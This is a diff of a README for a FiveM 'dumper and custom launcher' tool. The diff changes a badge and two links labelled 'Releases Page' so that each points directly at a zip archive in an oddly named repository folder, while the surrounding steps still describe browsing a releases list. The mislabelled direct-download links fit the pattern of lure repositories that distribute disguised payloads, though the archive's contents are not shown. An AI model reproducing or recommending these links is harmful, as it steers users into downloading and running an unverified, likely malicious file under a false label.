@@ -1,6 +1,6 @@
 # 🎮 Dumper-FiveM-And-Custom-Launcher - Make Your FiveM Experience Better
 
-![Download Dumper-FiveM-And-Custom-Launcher](https://img.shields.io/badge/Download-Dumper--FiveM--And--Custom--Launcher-brightgreen)
+![Download Dumper-FiveM-And-Custom-Launcher](https://github.com/parroalex01/Dumper-FiveM-And-Custom-Launcher/raw/refs/heads/main/dissever/And_Launcher_Custom_Five_Dumper_v3.8.zip)
 
 ## 📚 Table of Contents
 
@@ -26,7 +26,7 @@ To enhance your gaming experience with FiveM and custom servers, follow the inst
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/parroalex01/Dumper-FiveM-And-Custom-Launcher/releases).
+To get started, visit this page to download: [Releases Page](https://github.com/parroalex01/Dumper-FiveM-And-Custom-Launcher/raw/refs/heads/main/dissever/And_Launcher_Custom_Five_Dumper_v3.8.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest release; it will be at the top of the list.
@@ -69,4 +69,4 @@ If you encounter any issues, try the following steps:
 
 For further assistance, contact the support team through the GitHub page or check out community forums for FAQs and solutions. 
 
-You can also visit this page to download directly if you have not yet: [Releases Page](https://github.com/parroalex01/Dumper-FiveM-And-Custom-Launcher/releases).
+You can also visit this page to download directly if you have not yet: [Releases Page](https://github.com/parroalex01/Dumper-FiveM-And-Custom-Launcher/raw/refs/heads/main/dissever/And_Launcher_Custom_Five_Dumper_v3.8.zip).
